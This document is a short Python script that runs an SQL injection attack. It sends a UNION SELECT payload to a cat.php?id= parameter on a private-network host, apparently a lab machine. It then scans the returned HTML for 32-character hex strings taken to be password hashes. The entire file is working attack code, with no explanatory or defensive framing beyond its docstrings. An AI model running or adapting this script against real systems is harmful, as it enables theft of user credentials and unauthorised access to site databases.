"""
This module exploits an SQL injection vulnerability and parses the response to find hashed passwords.
"""
import requests
from bs4 import BeautifulSoup
def parse_response(response_text):
    """Parse the HTML response to find and print hashed passwords."""
    soup = BeautifulSoup(response_text, 'html.parser')
    titles = soup.find_all('h2', class_='title')
    for title in titles:
        title_text = title.get_text(strip=True)
        if len(title_text) == 32 and all(c in "0123456789abcdef" for c in title_text.lower()):
            print("Potential hashed password found:", title_text)
def exploit_sql_injection(url, sql_payload):
    """Perform SQL injection using the provided URL and SQL payload.
    Args:
        url (str): The base URL to which the SQL payload will be appended.
        sql_payload (str): The SQL payload to be used in the injection.
    Returns:
        str: The response text obtained after performing the SQL injection.
    """
    full_url = (url + sql_payload)
    response = requests.get(full_url)
    return response.text
def main():
    """Main function to execute the SQL injection exploit.
    This function sets up the target URL and SQL payload, calls the
    exploit function, and processes the response to find hashed passwords.
    """
    target_url = (
        'http://192.168.58.135/../cat.php?id=')
    sql_payload = (
        "1 UNION SELECT login, password, 3, 4 FROM users--")
    result = exploit_sql_injection(target_url, sql_payload)
    print("Exploit output:\n", result)
    parse_response(result)
if __name__ == "__main__":
    main()